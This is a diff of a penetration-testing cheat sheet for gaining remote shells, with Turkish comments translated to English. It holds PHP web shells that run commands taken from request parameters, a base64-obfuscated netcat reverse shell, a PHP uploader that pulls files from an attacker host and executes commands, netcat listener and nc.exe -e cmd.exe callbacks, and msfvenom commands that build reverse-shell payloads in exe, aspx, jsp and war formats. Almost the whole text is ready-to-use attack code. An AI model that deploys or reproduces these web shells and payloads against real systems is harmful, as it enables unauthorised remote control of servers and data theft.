@@ -1,23 +1,56 @@
-#PHP
+#with PHP
 ----------------------------------------------------------------------------------------------------------
 
 <?php system($_GET["cmd"]); ?>
 <?php echo shell_exec($_GET["cmd"]); ?>
+<?php exec(base64_decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTxhdHRhY2tlcl9pcD4gPGF0dGFja2VyX3BvcnQ+ID4vdG1wL2Y=')); ?>
 
-//Kod yüklemek / yürütmek için güvenilir, basit PHP kabuğu;
+//Secure, simple PHP shell to load and execute code;
 
 if (isset($_REQUEST['fupload'])) {
-  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.16.10:8000/" . $_REQUEST['fupload']));
+  file_put_contents($_REQUEST['fupload'], file_get_contents("http://<attacker_ip>:8000/" . $_REQUEST['fupload']));
 };
 
 if (isset($_REQUEST['fexec'])) {
   echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
 };
 
-//Dinleyiciyi başlat;
-
+//Start the listener on the attacker machine;
 nc -lvp 1234
 
-//Çalıştır ve shelli yakala;
+//Call the script and get the shell;
+http://10.10.10.9/catch.php?fexec=nc.exe <attacker_ip> 1234 -e cmd.exe```
 
-http://10.10.10.9/catch.php?fexec=nc.exe 10.10.16.10 1234 -e cmd.exe```
+
+----------------------------------------------------------------------------------------------------------
+
+#with Msfvenom
+
+//Listing payloads (spesific)
+msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+
+.exe;
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe > asd.exe
+
+.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f aspx > asd.aspx
+
+.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f raw > asd.jsp
+
+.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f war > shell.war
+
+----------------------------------------------------------------------------------------------------------
+
+#with Kali
+
+/usr/share/laudanum/
+
+----------------------------------------------------------------------------------------------------------
+
+#with online reverse shell
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
